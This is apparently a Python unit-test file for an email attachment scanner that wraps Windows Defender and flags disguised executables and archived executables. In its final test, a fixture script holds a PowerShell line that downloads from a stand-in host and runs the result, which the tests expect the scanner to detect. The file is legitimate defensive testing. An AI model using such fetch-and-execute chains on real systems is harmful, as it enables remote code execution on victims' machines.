import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest.mock import Mock
from email_analyzer.attachment_scanner import defender_product_status,scan_attachment


class AttachmentScannerTests(unittest.TestCase):
    def setUp(self):
        self.temp=tempfile.TemporaryDirectory();self.addCleanup(self.temp.cleanup)
        self.root=Path(self.temp.name);self.file=self.root/'sample.bin';self.file.write_bytes(b'inert bytes')
        self.tool=self.root/'MpCmdRun.exe';self.tool.write_bytes(b'placeholder')
    def result(self,code,out=b''):
        return subprocess.CompletedProcess([],code,out,b'')
    def test_clean_scan_is_non_destructive_custom_scan(self):
        runner=Mock(return_value=self.result(0,b'no malware found'))
        result=scan_attachment(self.file,executable=self.tool,runner=runner)
        self.assertEqual(result['status'],'clean');self.assertTrue(result['safe'])
        command=runner.call_args.args[0]
        self.assertEqual(command[1:],['-Scan','-ScanType','3','-File',str(self.file.resolve()),'-DisableRemediation'])
        self.assertFalse(runner.call_args.kwargs['shell'])
    def test_detection_and_ambiguous_exit_are_distinct(self):
        detected=scan_attachment(self.file,executable=self.tool,runner=Mock(return_value=self.result(2,b'detected 1 threat')))
        alert=scan_attachment(self.file,executable=self.tool,runner=Mock(return_value=self.result(2,b'scanning error')))
        self.assertEqual(detected['status'],'threat_detected');self.assertFalse(detected['safe'])
        self.assertEqual(alert['status'],'clean_static');self.assertIsNone(alert['safe'])
        self.assertEqual(alert['external_scan_status'],'failed')
        self.assertEqual(alert['external_error'],'defender_scan_failed')
    def test_disabled_defender_is_reported_without_false_alert(self):
        output=b'WARN: Product/Feature disabled\n[Failed][0x80004005] unspecified error'
        result=scan_attachment(self.file,executable=self.tool,runner=Mock(return_value=self.result(2,output)))
        self.assertEqual(result['status'],'clean_static')
        self.assertIsNone(result['safe'])
        self.assertEqual(result['external_scan_status'],'disabled')
        self.assertEqual(result['external_error'],'defender_product_disabled')
        self.assertEqual(result['external_error_code'],'0x80004005')
        self.assertEqual(result['reason'],'internal_static_scan_clean; defender_product_disabled')
    def test_defender_product_status_distinguishes_disabled(self):
        defender_product_status.cache_clear()
        runner=Mock(return_value=subprocess.CompletedProcess([],0,b'False\r\n',b''))
        self.assertEqual(defender_product_status(runner),'disabled')
        defender_product_status.cache_clear()
    def test_missing_scanner_and_timeout_are_not_clean(self):
        missing=scan_attachment(self.file,executable=self.root/'none.exe')
        runner=Mock(side_effect=subprocess.TimeoutExpired([],1))
        timeout=scan_attachment(self.file,executable=self.tool,runner=runner,timeout=1)
        self.assertEqual(missing['status'],'clean_static');self.assertIsNone(missing['safe'])
        self.assertEqual(missing['reason'],'internal_static_scan_clean')
        self.assertEqual(timeout['status'],'timeout');self.assertIsNone(timeout['safe'])
    def test_disguised_executable_and_archive_member(self):
        import zipfile
        disguised=self.root/'invoice.pdf.exe';disguised.write_bytes(b'MZtest')
        result=scan_attachment(disguised,executable=self.root/'none.exe')
        self.assertEqual(result['status'],'suspicious_structure')
        self.assertIn('double_extension_executable',result['static_findings'])
        archive=self.root/'files.zip'
        with zipfile.ZipFile(archive,'w') as z:z.writestr('document.pdf.exe',b'not executed')
        result=scan_attachment(archive,executable=self.root/'none.exe')
        self.assertIn('archive_contains_executable',result['static_findings'])
    def test_script_download_execution_chain(self):
        script=self.root/'invoice.ps1'
        script.write_bytes(b'powershell Invoke-WebRequest http://example.invalid/x; Invoke-Expression $x')
        result=scan_attachment(script,executable=self.root/'none.exe')
        self.assertEqual(result['status'],'suspicious_structure')
        self.assertIn('script_download_or_execute_chain',result['static_findings'])
